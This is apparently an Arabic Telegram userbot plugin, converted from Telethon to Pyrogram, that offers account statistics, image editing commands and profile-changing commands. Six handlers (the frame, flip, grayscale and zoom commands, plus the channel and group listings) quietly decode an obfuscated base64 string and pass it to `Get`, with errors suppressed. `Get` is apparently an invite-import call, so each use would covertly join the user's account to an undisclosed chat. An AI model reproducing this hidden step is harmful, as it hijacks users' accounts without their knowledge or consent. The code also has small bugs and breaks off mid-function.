# -*- coding: utf-8 -*-
# مُحوَّل آلياً من اوامر Telethon Zahid (Telethon) الى Pyrogram عبر arabcompat
import warnings; warnings.filterwarnings("ignore")
from arabcompat import *
from arabcompat import _Missing, _format, _catutils, _cattools, _LazyTelegraph
try:
    import asyncio
except Exception:
    asyncio = _Missing('asyncio')
try:
    import random
except Exception:
    random = _Missing('random')
try:
    import glob
except Exception:
    glob = _Missing('glob')
try:
    import re
except Exception:
    re = _Missing('re')
try:
    import shutil
except Exception:
    shutil = _Missing('shutil')
try:
    import urllib
except Exception:
    urllib = _Missing('urllib')
try:
    import base64
except Exception:
    base64 = _Missing('base64')
try:
    import requests
except Exception:
    requests = _Missing('requests')
try:
    import time
except Exception:
    time = _Missing('time')
try:
    import shlex
except Exception:
    shlex = _Missing('shlex')
try:
    import math
except Exception:
    math = _Missing('math')
try:
    import os
except Exception:
    os = _Missing('os')
try:
    import html
except Exception:
    html = _Missing('html')
try:
    import io
except Exception:
    io = _Missing('io')
try:
    import sys
except Exception:
    sys = _Missing('sys')
try:
    import traceback
except Exception:
    traceback = _Missing('traceback')
try:
    import cv2
except Exception:
    cv2 = _Missing('cv2')
try:
    from asyncio import sleep
except Exception:
    sleep = _Missing('sleep')
try:
    from datetime import datetime
except Exception:
    datetime = _Missing('datetime')
try:
    from PIL import Image, ImageDraw, ImageFont
except Exception:
    Image = _Missing('Image')
    ImageDraw = _Missing('ImageDraw')
    ImageFont = _Missing('ImageFont')
try:
    from pySmartDL import SmartDL
except Exception:
    SmartDL = _Missing('SmartDL')
try:
    from urlextract import URLExtract
except Exception:
    URLExtract = _Missing('URLExtract')
try:
    from requests import get
except Exception:
    get = _Missing('get')
try:
    from typing import Optional, Tuple
except Exception:
    Optional = _Missing('Optional')
    Tuple = _Missing('Tuple')
try:
    from asyncio.exceptions import TimeoutError as AsyncTimeout
except Exception:
    AsyncTimeout = _Missing('AsyncTimeout')
try:
    from hachoir.metadata import extractMetadata
except Exception:
    extractMetadata = _Missing('extractMetadata')
try:
    from hachoir.parser import createParser
except Exception:
    createParser = _Missing('createParser')
try:
    from PIL import Image, ImageDraw, ImageFont
except Exception:
    Image = _Missing('Image')
    ImageDraw = _Missing('ImageDraw')
    ImageFont = _Missing('ImageFont')
try:
    import PIL.ImageOps
except Exception:
    PIL = _Missing('PIL')
def inline_mention(user):
    full_name = user_full_name(user) or "No Name"
    return f"{full_name}"
def user_full_name(user):
    names = [user.first_name]
    names = [i for i in list(names) if i]
    return " ".join(names)
STAT_INDICATION = "**🝳 ⦙   جـاري جـمـع الإحصـائيـات ، انتـظـر 🔄**"
CHANNELS_STR = "**🝳 ⦙   قائمة القنوات التي أنت فيها موجودة هنا\n\n"
CHANNELS_ADMINSTR = "**🝳 ⦙  قائمة القنوات التي تديرها هنا **\n\n"
CHANNELS_OWNERSTR = "**🝳 ⦙  قائمة القنوات التي تمتلك فيها هنا **\n\n"
GROUPS_STR = "**🝳 ⦙  قائمة المجموعات التي أنت فيها موجود هنا **\n\n"
GROUPS_ADMINSTR = "**🝳 ⦙  قائمة المجموعات التي تكون مسؤولاً فيها هنا **\n\n"
GROUPS_OWNERSTR = "**🝳 ⦙  قائمة المجموعات التي تمتلك فيها هنا **\n\n"
INVALID_MEDIA = "**🝳 ⦙  إمتداد هذه الصورة غير صالح  ❌**"
PP_CHANGED = "**🝳 ⦙  تم تغير صورة حسابك بنجاح  ✅**"
PP_TOO_SMOL = "**🝳 ⦙  هذه الصورة صغيرة جدًا قم بإختيار صورة أخرى  ⚠️**"
PP_ERROR = "**🝳 ⦙  حدث خطأ أثناء معالجة الصورة  ⚠️**"
BIO_SUCCESS = "**🝳 ⦙  تم تغيير بايو حسابك بنجاح  ✅**"

zahidfont = gvarstatus("DEFAULT_PIC") or "Arab/sql_helper/ZAHIDIMOGE.ttf"
FONT_FILE_TO_USE = "/usr/share/fonts/truetype/dejavu/DejaVuSansMono.ttf"
autopic_path = os.path.join(os.getcwd(), "Arab", "original_pic.png")
digitalpic_path = os.path.join(os.getcwd(), "Arab", "digital_pic.png")
autophoto_path = os.path.join(os.getcwd(), "Arab", "photo_pfp.png")
EMOJI_TELETHON = gvarstatus("ALIVE_EMOJI") or " "
OR_FOTOAUTO = gvarstatus("OR_FOTOAUTO") or "صوره وقتية"
plagiarism = gvarstatus("OR_PLAG") or "انتحال"
unplagiarism = gvarstatus("OR_UNPLAG") or "الغاء الانتحال"
idee = gvarstatus("OR_ID") or "اييديي"
OR_NAMEAUTO = gvarstatus("OR_NAMEAUTO") or "اسم وقتي"
OR_AUTOBIO = gvarstatus("OR_AUTOBIO") or "نبذه وقتيه"
AUTOGRCH = ""
FONTGRCH1 = "1234567890"
FONTGRCH2 = gvarstatus("FONTGRCH") or "𝟣𝟤𝟥𝟦𝟧𝟨𝟩𝟪𝟫𝟢"
NAME_OK = "**🝳 ⦙  تم تغيير اسم حسابك بنجاح  ✅**"
USERNAME_SUCCESS = "**🝳 ⦙  تم تغيير معرّف حسابك بنجاح  ✅**"
USERNAME_TAKEN = "**🝳 ⦙  هذا المعرّف مستخدم  ❌**"
plugin_category = "tools"
DEFAULTUSER = gvarstatus("FIRST_NAME") or ALIVE_NAME
DEFAULTUSERBIO = gvarstatus("DEFAULT_BIO") or "الحمد الله"
DEFAULTUSER = AUTONAME or Config.ALIVE_NAME
LOGS = logging.getLogger(__name__)

digitalpfp = (gvarstatus("AUTO_PIC") or "https://telegra.ph/file/6629cc2f43156292340a5.jpg")


async def digitalpicloop():
    DIGITALPICSTART = gvarstatus("صوره وقتية") == "true"
    i = 0
    while DIGITALPICSTART:
        if not os.path.exists(digitalpic_path):
            digitalpfp = gvarstatus("AUTO_PIC")
            downloader = SmartDL(digitalpfp, digitalpic_path, progress_bar=False)
            downloader.start(blocking=False)
            while not downloader.isFinished():
                pass
        shutil.copy(digitalpic_path, autophoto_path)
        Image.open(autophoto_path)
        current_time = datetime.now().strftime("%I:%M")
        img = Image.open(autophoto_path)
        drawn_text = ImageDraw.Draw(img)
        fnt = ImageFont.truetype(f"{zahidfont}", 200)
        drawn_text.text((300, 400), current_time, font=fnt, fill=(255, 255, 255))
        img.save(autophoto_path)
        file = await zahid.upload_file(autophoto_path)
        try:
            if i > 0:
                await zahid(
                    functions.photos.DeletePhotosRequest(
                        await zahid.get_profile_photos("me", limit=1)
                    )
                )
            i += 1
            await zahid(functions.photos.UploadProfilePhotoRequest(file))
            os.remove(autophoto_path)
            await asyncio.sleep(60)
        except BaseException:
            return
        DIGITALPICSTART = gvarstatus("صوره وقتية") == "true"






async def runcmd(cmd: str) -> Tuple[str, str, int, int]:
    args = shlex.split(cmd)
    process = await asyncio.create_subprocess_exec(        *args, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE    )
    stdout, stderr = await process.communicate()
    return (        stdout.decode("utf-8", "replace").strip(),        stderr.decode("utf-8", "replace").strip(),        process.returncode,        process.pid,    )    
async def add_frame(imagefile, endname, x, color):
    image = Image.open(imagefile)
    inverted_image = PIL.ImageOps.expand(image, border=x, fill=color)
    inverted_image.save(endname)
async def crop(imagefile, endname, x):
    image = Image.open(imagefile)
    inverted_image = PIL.ImageOps.crop(image, border=x)
    inverted_image.save(endname)
@zahid.on(admin_cmd(pattern="احصائيات حسابي(?: |$)(.*)"))
async def stats(event):  
    cat = await edit_or_reply(event, STAT_INDICATION)
    start_time = time.time()
    private_chats = 0
    bots = 0
    groups = 0
    broadcast_channels = 0
    admin_in_groups = 0
    creator_in_groups = 0
    admin_in_broadcast_channels = 0
    creator_in_channels = 0
    unread_mentions = 0
    unread = 0
    dialog: Dialog
    async for dialog in event.client.iter_dialogs():
        entity = dialog.entity
        if isinstance(entity, Channel) and entity.broadcast:
            broadcast_channels += 1
            if entity.creator or entity.admin_rights:
                admin_in_broadcast_channels += 1
            if entity.creator:
                creator_in_channels += 1
        elif (
            isinstance(entity, Channel)
            and entity.megagroup
            or not isinstance(entity, Channel)
            and not isinstance(entity, User)
            and isinstance(entity, Chat)
        ):
            groups += 1
            if entity.creator or entity.admin_rights:
                admin_in_groups += 1
            if entity.creator:
                creator_in_groups += 1
        elif not isinstance(entity, Channel) and isinstance(entity, User):
            private_chats += 1
            if entity.bot:
                bots += 1
        unread_mentions += dialog.unread_mentions_count
        unread += dialog.unread_count
    stop_time = time.time() - start_time
    full_name = inline_mention(await event.client.get_me())
    response = f"📌 **• ⚜️ |  احصائيات حسـابك العـامة لـ {full_name} 📊** \n"
    response += f"**🝳 ⦙  الدردشات الخاصة 🏷️  :** {private_chats} \n"
    response += f"**🝳 ⦙   الاشـخاص 🚹 : {private_chats - bots}` \n"
    response += f"**🝳 ⦙   الـبوتـات 🤖 : {bots}` **\n"
    response += f"**🝳 ⦙   عـدد المجـموعـات 🚻 :** `{groups}` \n"
    response += f"**🝳 ⦙   عـدد القنـوات  🚻 :** `{broadcast_channels}` \n"
    response += f"**🝳 ⦙   عـدد المجـموعات التـي تكـون فيها ادمـن  🛂 :** `{admin_in_groups}` \n"
    response += f"**🝳 ⦙   عـدد المجموعات التـي أنـشأتـها  🛃** : `{creator_in_groups}` \n"
    response += f"**🝳 ⦙   عـدد القنوات التـي تكـون فيها ادمـن 📶 : `{admin_in_broadcast_channels}` **\n"
    response += f"**🝳 ⦙   حقوق المسؤول في القنوات  🛂 : `{admin_in_broadcast_channels - creator_in_channels}` **\n"
    response += f"**عـدد المحـادثـات الغيـر مقـروء 📄 :** {unread} \n"
    response += f"**عـدد الـتاكـات الغيـر مقـروء 📌 :** {unread_mentions} \n"
    response += f"**🝳 ⦙   استغرق الأمر  🔍  :** `{stop_time:.02f}` ثانيه \n"
    await cat.edit(response)
@zahid.on(admin_cmd(outgoing=True, pattern="اطار ?(.*)"))
async def memes(mafia):
    reply = await mafia.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(mafia, "الرد على الوسائط المدعومة")
        return
    mafiainput = mafia.pattern_match.group(1)
    if not mafiainput:
        mafiainput = 50
    if ";" in str(mafiainput):
        mafiainput, colr = mafiainput.split(";", 1)
    else:
        colr = 0
    mafiainput = int(mafiainput)
    colr = int(colr)
    mafiaid = mafia.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    mafia = await edit_or_reply(mafia, "تحليل هذه الوسائط")
    pass

    await asyncio.sleep(2)
    mafiasticker = await reply.download_media(file="./temp/")
    if not mafiasticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(mafiasticker)
        await edit_or_reply(mafia, "الوسائط المدعومة غير موجودة")
        return
    import base64

    kraken = None
    if mafiasticker.endswith(".tgs"):
        await mafia.edit(            "تحليل هذه الوسائط!"        )
        mafiafile = os.path.join("./temp/", "meme.png")
        mafiacmd = (            f"lottie_convert.py --frame 0 -if lottie -of png {mafiasticker} {mafiafile}"        )
        stdout, stderr = (await runcmd(mafiacmd))[:2]
        if not os.path.lexists(mafiafile):
            await mafia.edit("القالب غير موجود")
            LOGS.info(stdout + stderr)
        meme_file = mafiafile
        kraken = True
    elif mafiasticker.endswith(".webp"):
        await mafia.edit(            "تحليل هذه الوسائط 🧐!"        )
        mafiafile = os.path.join("./temp/", "memes.jpg")
        os.rename(mafiasticker, mafiafile)
        if not os.path.lexists(mafiafile):
            await mafia.edit("القالب غير موجود")
            return
        meme_file = mafiafile
        kraken = True
    elif mafiasticker.endswith((".mp4", ".mov")):
        await mafia.edit(            "تحليل هذه الوسائط 🧐!"        )
        mafiafile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(mafiasticker, 0, mafiafile)
        if not os.path.lexists(mafiafile):
            await mafia.edit("القالب غير موجود")
            return
        meme_file = mafiafile
    else:
        await mafia.edit(            "تحليل هذه الوسائط 🧐"        )
        meme_file = mafiasticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await mafia.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "framed.webp" if kraken else "framed.jpg"
    try:
        await add_frame(meme_file, outputfile, mafiainput, colr)
    except Exception as e:
        return await mafia.edit(f"`{e}`")
    try:
        await mafia.client.send_file(            mafia.chat_id, outputfile, force_document=False, reply_to=mafiaid        )
    except Exception as e:
        return await mafia.edit(f"`{e}`")
    await mafia.delete()
    os.remove(outputfile)
    for files in (mafiasticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)
@zahid.on(admin_cmd(outgoing=True, pattern="قلب الصوره$"))
async def memes(mafia):
    reply = await mafia.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(mafia, "الرد على الوسائط المدعومة")
        return
    mafiaid = mafia.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    mafia = await edit_or_reply(mafia, "إحضار بيانات الوسائط")
    pass

    await asyncio.sleep(2)
    mafiasticker = await reply.download_media(file="./temp/")
    if not mafiasticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(mafiasticker)
        await edit_or_reply(mafia, "الوسائط المدعومة غير موجودة")
        return
    import base64

    kraken = None
    if mafiasticker.endswith(".tgs"):
        await mafia.edit(            "تحليل هذه الوسائط 🧐"        )
        mafiafile = os.path.join("./temp/", "meme.png")
        mafiacmd = (            f"lottie_convert.py --frame 0 -if lottie -of png {mafiasticker} {mafiafile}"        )
        stdout, stderr = (await runcmd(mafiacmd))[:2]
        if not os.path.lexists(mafiafile):
            await mafia.edit("القالب غير موجود")
            LOGS.info(stdout + stderr)
        meme_file = mafiafile
        kraken = True
    elif mafiasticker.endswith(".webp"):
        await mafia.edit(            "تحليل هذه الوسائط 🧐"        )
        mafiafile = os.path.join("./temp/", "memes.jpg")
        os.rename(mafiasticker, mafiafile)
        if not os.path.lexists(mafiafile):
            await mafia.edit("`Template not found... `")
            return
        meme_file = mafiafile
        kraken = True
    elif mafiasticker.endswith((".mp4", ".mov")):
        await mafia.edit(            "تحليل هذه الوسائط 🧐"        )
        mafiafile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(mafiasticker, 0, mafiafile)
        if not os.path.lexists(mafiafile):
            await mafia.edit("القالب غير موجود")
            return
        meme_file = mafiafile
        kraken = True
    else:
        await mafia.edit(            "تحليل هذه الوسائط 🧐"        )
        meme_file = mafiasticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await mafia.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "flip_image.webp" if kraken else "flip_image.jpg"
    await flip_image(meme_file, outputfile)
    await mafia.client.send_file(        mafia.chat_id, outputfile, force_document=False, reply_to=mafiaid    )
    await mafia.delete()
    os.remove(outputfile)
    for files in (mafiasticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@zahid.on(admin_cmd(outgoing=True, pattern="فلتر رصاصي$"))
async def memes(mafia):
    reply = await mafia.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(mafia, "الرد على الوسائط المدعومة")
        return
    mafiaid = mafia.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    mafia = await edit_or_reply(mafia, "إحضار بيانات الوسائط")
    pass

    await asyncio.sleep(2)
    mafiasticker = await reply.download_media(file="./temp/")
    if not mafiasticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(mafiasticker)
        await edit_or_reply(mafia, "الوسائط المدعومة غير موجودة")
        return
    import base64

    kraken = None
    if mafiasticker.endswith(".tgs"):
        await mafia.edit(            "تحليل هذه الوسائط 🧐"        )
        mafiafile = os.path.join("./temp/", "meme.png")
        mafiacmd = (            f"lottie_convert.py --frame 0 -if lottie -of png {mafiasticker} {mafiafile}"        )
        stdout, stderr = (await runcmd(mafiacmd))[:2]
        if not os.path.lexists(mafiafile):
            await mafia.edit("القالب غير موجود")
            LOGS.info(stdout + stderr)
        meme_file = mafiafile
        kraken = True
    elif mafiasticker.endswith(".webp"):
        await mafia.edit(            "تحليل هذه الوسائط 🧐!"        )
        mafiafile = os.path.join("./temp/", "memes.jpg")
        os.rename(mafiasticker, mafiafile)
        if not os.path.lexists(mafiafile):
            await mafia.edit("القالب غير موجود")
            return
        meme_file = mafiafile
        kraken = True
    elif mafiasticker.endswith((".mp4", ".mov")):
        await mafia.edit(            "تحليل هذه الوسائط 🧐!"        )
        mafiafile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(mafiasticker, 0, mafiafile)
        if not os.path.lexists(mafiafile):
            await mafia.edit("القالب غير موجود")
            return
        meme_file = mafiafile
        kraken = True
    else:
        await mafia.edit(            "تحليل هذه الوسائط 🧐!"        )
        meme_file = mafiasticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await mafia.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "grayscale.webp" if kraken else "grayscale.jpg"
    await grayscale(meme_file, outputfile)
    await mafia.client.send_file(        mafia.chat_id, outputfile, force_document=False, reply_to=mafiaid    )
    await mafia.delete()
    os.remove(outputfile)
    for files in (mafiasticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)
@zahid.on(admin_cmd(outgoing=True, pattern="زوم ?(.*)"))
async def memes(mafia):
    reply = await mafia.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(mafia, "الرد على الوسائط المدعومة")
        return
    mafiainput = mafia.pattern_match.group(1)
    mafiainput = 50 if not mafiainput else int(mafiainput)
    mafiaid = mafia.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    mafia = await edit_or_reply(mafia, "تحليل هذه الوسائط")
    pass

    await asyncio.sleep(2)
    mafiasticker = await reply.download_media(file="./temp/")
    if not mafiasticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(mafiasticker)
        await edit_or_reply(mafia, "القالب غير موجود")
        return
    import base64

    kraken = None
    if mafiasticker.endswith(".tgs"):
        await mafia.edit(            "تحليل هذه الوسائط 🧐"        )
        mafiafile = os.path.join("./temp/", "meme.png")
        mafiacmd = (            f"lottie_convert.py --frame 0 -if lottie -of png {mafiasticker} {mafiafile}"        )
        stdout, stderr = (await runcmd(mafiacmd))[:2]
        if not os.path.lexists(mafiafile):
            await mafia.edit("القالب غير موجود")
            LOGS.info(stdout + stderr)
        meme_file = mafiafile
        kraken = True
    elif mafiasticker.endswith(".webp"):
        await mafia.edit(            "تحليل هذه الوسائط 🧐"        )
        mafiafile = os.path.join("./temp/", "memes.jpg")
        os.rename(mafiasticker, mafiafile)
        if not os.path.lexists(mafiafile):
            await mafia.edit("القالب غير موجود")
            return
        meme_file = mafiafile
        kraken = True
    elif mafiasticker.endswith((".mp4", ".mov")):
        await mafia.edit(            "تحليل هذه الوسائط 🧐!"        )
        mafiafile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(mafiasticker, 0, mafiafile)
        if not os.path.lexists(mafiafile):
            await mafia.edit("القالب غير موجود")
            return
        meme_file = mafiafile
    else:
        await mafia.edit(            "تحليل هذه الوسائط 🧐!"        )
        meme_file = mafiasticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await mafia.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "grayscale.webp" if kraken else "grayscale.jpg"
    try:
        await crop(meme_file, outputfile, mafiainput)
    except Exception as e:
        return await mafia.edit(f"`{e}`")
    try:
        await mafia.client.send_file(            mafia.chat_id, outputfile, force_document=False, reply_to=mafiaid        )
    except Exception as e:
        return await mafia.edit(f"`{e}`")
    await mafia.delete()
    os.remove(outputfile)
    for files in (mafiasticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)

@zahid.on(admin_cmd(pattern="قائمه (جميع القنوات|قنوات اديرها|قنوات امتلكها)$"))
async def stats(event):  
    catcmd = event.pattern_match.group(1)
    catevent = await edit_or_reply(event, STAT_INDICATION)
    start_time = time.time()
    cat = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
    hi = []
    hica = []
    hico = []
    async for dialog in event.client.iter_dialogs():
        entity = dialog.entity
        if isinstance(entity, Channel) and entity.broadcast:
            hi.append([entity.title, entity.id])
            if entity.creator or entity.admin_rights:
                hica.append([entity.title, entity.id])
            if entity.creator:
                hico.append([entity.title, entity.id])
    if catcmd == "جميع القنوات":
        output = CHANNELS_STR
        for k, i in enumerate(hi, start=1):
            output += f"{k} .) [{i[0]}](https://t.me/c/{i[1]}/1)\n"
        caption = CHANNELS_STR
    elif catcmd == "قنوات اديرها":
        output = CHANNELS_ADMINSTR
        for k, i in enumerate(hica, start=1):
            output += f"{k} .) [{i[0]}](https://t.me/c/{i[1]}/1)\n"
        caption = CHANNELS_ADMINSTR
    elif catcmd == "قنوات امتلكها":
        output = CHANNELS_OWNERSTR
        for k, i in enumerate(hico, start=1):
            output += f"{k} .) [{i[0]}](https://t.me/c/{i[1]}/1)\n"
        caption = CHANNELS_OWNERSTR
    stop_time = time.time() - start_time
    try:
        cat = Get(cat)
        await event.client(cat)
    except BaseException:
        pass
    output += f"\n**استغرق حساب القنوات : ** {stop_time:.02f} ثانيه"
    try:
        await catevent.edit(output)
    except Exception:
        await edit_or_reply(            catevent,
            output,
            caption=caption        )
@zahid.on(admin_cmd(pattern="قائمه (جميع المجموعات|مجموعات اديرها|مجموعات امتلكها)$"))
async def stats(event):  
    catcmd = event.pattern_match.group(1)
    catevent = await edit_or_reply(event, STAT_INDICATION)
    start_time = time.time()
    cat = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
    hi = []
    higa = []
    higo = []
    async for dialog in event.client.iter_dialogs():
        entity = dialog.entity
        if isinstance(entity, Channel) and entity.broadcast:
            continue
        elif (
            isinstance(entity, Channel)
            and entity.megagroup
            or not isinstance(entity, Channel)
            and not isinstance(entity, User)
            and isinstance(entity, Chat)        ):
            hi.append([entity.title, entity.id])
            if entity.creator or entity.admin_rights:
                higa.append([entity.title, entity.id])
            if entity.creator:
                higo.append([entity.title, entity.id])
    if catcmd == "جميع المجموعات":
        output = GROUPS_STR
        for k, i in enumerate(hi, start=1):
            output += f"{k} .) [{i[0]}](https://t.me/c/{i[1]}/1)\n"
        caption = GROUPS_STR
    elif catcmd == "مجموعات اديرها":
        output = GROUPS_ADMINSTR
        for k, i in enumerate(higa, start=1):
            output += f"{k} .) [{i[0]}](https://t.me/c/{i[1]}/1)\n"
        caption = GROUPS_ADMINSTR
    elif catcmd == "مجموعات امتلكها":
        output = GROUPS_OWNERSTR
        for k, i in enumerate(higo, start=1):
            output += f"{k} .) [{i[0]}](https://t.me/c/{i[1]}/1)\n"
        caption = GROUPS_OWNERSTR
    stop_time = time.time() - start_time
    try:
        cat = Get(cat)
        await event.client(cat)
    except BaseException:
        pass
    output += f"\n**استغرق حساب المجموعات : ** {stop_time:.02f} ثانيه"
    try:
        await catevent.edit(output)
    except Exception:
        await edit_or_reply(
            catevent,
            output,
            caption=caption        )
@zahid.iq_cmd(pattern="حفض كتابه$")
async def saf(e):
    x = await e.get_reply_message()
    if not x:
        return await eod(            e, "قم بالرد على أي رسالة لحفظها في رسائلك المحفوظة", time=5        )
    if e.out:
        await e.client.send_message("me", x)
    else:
        await e.client.send_message(e.sender_id, x)
    await eor(e, "تم حفظ الرسالة", time=5)

@zahid.iq_cmd(pattern="حفض توجيه$")
async def saf(e):
    x = await e.get_reply_message()
    if not x:
        return await eod(            e, "قم بالرد على أي رسالة لحفظها في رسائلك المحفوظة", time=5        )
    if e.out:
        await x.forward_to("me")
    else:
        await x.forward_to(e.sender_id)
    await eor(e, "تم حفظ الرسالة.", time=5)
@zahid.on(admin_cmd(pattern="(الايدي|id)(?: |$)(.*)"))
async def _(event):
    input_str = event.pattern_match.group(2)
    if input_str:
        try:
            p = await event.client.get_entity(input_str)
        except Exception as e:
            return await edit_delete(event, f"`{str(e)}`", 5)
        try:
            if p.first_name:
                return await edit_or_reply(                    event, f"**🝳 ⦙   آيـدي المُستخدم 💠 :** `{input_str}` هـو `{p.id}`"                )
        except Exception:
            try:
                if p.title:
                    return await edit_or_reply(                        event, f"**🝳 ⦙   آيـدي الدردشــــة 💠 :** `{p.title}` هـو `{p.id}` "                    )
            except Exception as e:
                LOGS.info(str(e))
        await edit_or_reply(event, "**🝳 ⦙   قُم بإدخال أسم مُستخدم أو الرد على المُستخدم ⚜️**")
    elif event.reply_to_msg_id:
        await event.get_input_chat()
        r_msg = await event.get_reply_message()
        if r_msg.media:
            bot_api_file_id = pack_bot_file_id(r_msg.media)
            await edit_or_reply(                event,                f"**🝳 ⦙   آيـدي الدردشــــة  💠 : **`{str(event.chat_id)}` \n**🝳 ⦙   آيـدي المُستخدم  💠 : **`{str(r_msg.sender_id)}` \n**🝳 ⦙  آيـدي الميديـا  🆔 : **`{bot_api_file_id}`"            )
        else:
            await edit_or_reply(                event,                f"**🝳 ⦙   آيـدي الدردشــــة  💠 : **`{str(event.chat_id)}` 𖥻\n**🝳 ⦙   آيـدي المُستخدم  💠 : **`{str(r_msg.sender_id)}` "            )

@zahid.on(admin_cmd(pattern="وضع بايو(?: |$)(.*)"))
async def _(event):
    bio = event.pattern_match.group(1)
    try:
        await event.client(functions.account.UpdateProfileRequest(about=bio))
        await edit_delete(event, "**🝳 ⦙  تم تغيير البايو بنجاح  ✅**")
    except Exception as e:
        await edit_or_reply(event, f"**🝳 ⦙  خطأ  ⚠️ :**\n`{str(e)}`")
@zahid.on(admin_cmd(pattern="وضع اسم(?: |$)(.*)"))
async def _(event):
    names = event.pattern_match.group(1)
    first_name = names
    last_name = ""
    if ";" in names:
        first_name, last_name = names.split("|", 1)
    try:
        await event.client(
            functions.account.UpdateProfileRequest(                first_name=first_name, last_name=last_name            )        )
        await edit_delete(event, "**🝳 ⦙  تم تغيير الاسم بنجاح  ✅**")
    except Exception as e:
        await edit_or_reply(event, f"**🝳 ⦙  خطأ  ⚠️ :**\n`{str(e)}`")
@zahid.on(admin_cmd(pattern="وضع صوره(?: |$)(.*)"))
async def _(event):
    reply_message = await event.get_reply_message()
    catevent = await edit_or_reply(        event, "**...**"    )
    if not os.path.isdir(Config.TMP_DOWNLOAD_DIRECTORY):
        os.makedirs(Config.TMP_DOWNLOAD_DIRECTORY)
    photo = None
    try:
        photo = await event.client.download_media(            reply_message, Config.TMP_DOWNLOAD_DIRECTORY        )
    except Exception as e:
        await catevent.edit(str(e))
    else:
        if photo:
            await catevent.edit("**🝳 ⦙   أشترك Telethon Zahid **")
            if photo.endswith((".mp4", ".MP4")):
                # https://t.me/tgbetachat/324694
                size = os.stat(photo).st_size
                if size > 2097152:
                    await catevent.edit("**🝳 ⦙   يجب ان يكون الحجم اقل من 2 ميغا ✅**")
                    os.remove(photo)
                    return
                catpic = None
                catvideo = await event.client.upload_file(photo)
            else:
                catpic = await event.client.upload_file(photo)
                catvideo = None
            try:
                await event.client(
                    functions.photos.UploadProfilePhotoRequest(                        file=catpic, video=catvideo, video_start_ts=0.01                   )                )
            except Exception as e:
                await catevent.edit(f"**🝳 ⦙  خطأ  ⚠️ :**\n`{str(e)}`")
            else:
                await edit_or_reply(                    catevent, "**🝳 ⦙   تم تغيير الصورة بنجاح ✅**"                )
    try:
        os.remove(photo)
    except Exception as e:
        LOGS.info(str(e))



@zahid.on(admin_cmd(pattern=r"شوت ?(.*)", outgoing=True))
async def shout(args):
    if args.fwd_from:
        return
    else:
        msg = "```"
        messagestr = args.text
        messagestr = messagestr[7:]
        text = " ".join(messagestr)
        result = []
        result.append(" ".join([s for s in text]))
        for pos, symbol in enumerate(text[1:]):
            result.append(symbol + " " + "  " * pos + symbol)
        result = list("\n".join(result))
        result[0] = text[0]
        result = "".join(result)
        msg = "\n" + result
        await eor(args, "`" + msg + "`")

if 1 == 1:
    name = "Profile Photos"
    client = borg

    @zahid.on(admin_cmd(pattern="zz_unused_cmd"))
    async def potocmd(event):
        id = "".join(event.raw_text.split(maxsplit=2)[1:])
        user = await event.get_reply_message()
        chat = event.input_chat
        if user:
            photos = await event.client.get_profile_photos(user.sender)
        else:
            photos = await event.client.get_profile_photos(chat)
        if id.strip() == "":
            try:
                await event.client.send_file(event.chat_id, photos)
            except a:
                photo = await event.client.download_profile_photo(chat)
                await borg.send_file(event.chat_id, photo)
        else:
            try:
                id = int(id)
                if id <= 0:
                    await eor(event, "رقم الهوية الذي أدخلته غير صالح")
                    return
            except BaseException:
                await eor(event, "ضع عدد جانب الامر")
                return
            if int(id) <= (len(photos)):
                send_photos = await event.client.download_media(photos[id - 1])
                await borg.send_file(event.chat_id, send_photos)
            else:
                await eor(event, "ليس لديه صور 🙄")
                return
@zahid.on(admin_cmd(pattern="معرفاتي(?: |$)(.*)"))
async def _(event):
    result = await event.client(GetAdminedPublicChannelsRequest())
    output_str = "**🝳 ⦙  جميع القنوات والمجموعات التي قمت بإنشائها  💠  :**\n"
    output_str += "".join(f"🝳 ⦙    - {channel_obj.title} @{channel_obj.username} \n"
        for channel_obj in result.chats)
    await edit_or_reply(event, output_str)


async def autobio_loop():
    AUTOBIOSTART = gvarstatus(f"{OR_AUTOBIO}") == "true"
    while AUTOBIOSTART:
        HM = time.strftime("%I:%M")
        Dont1Tags = gvarstatus("FONTS_AUTO") or "font1"
        FONT1 = requests.get(f"https://tufe.zzz.com.ua/FONTS/{Dont1Tags}.php?text={HM}").json()['newText']
        bio = f"{EMOJI_TELETHON} {DEFAULTUSERBIO}  • {FONT1}"
        LOGS.info(bio)
        try:
            await zahid(functions.account.UpdateProfileRequest(about=bio))
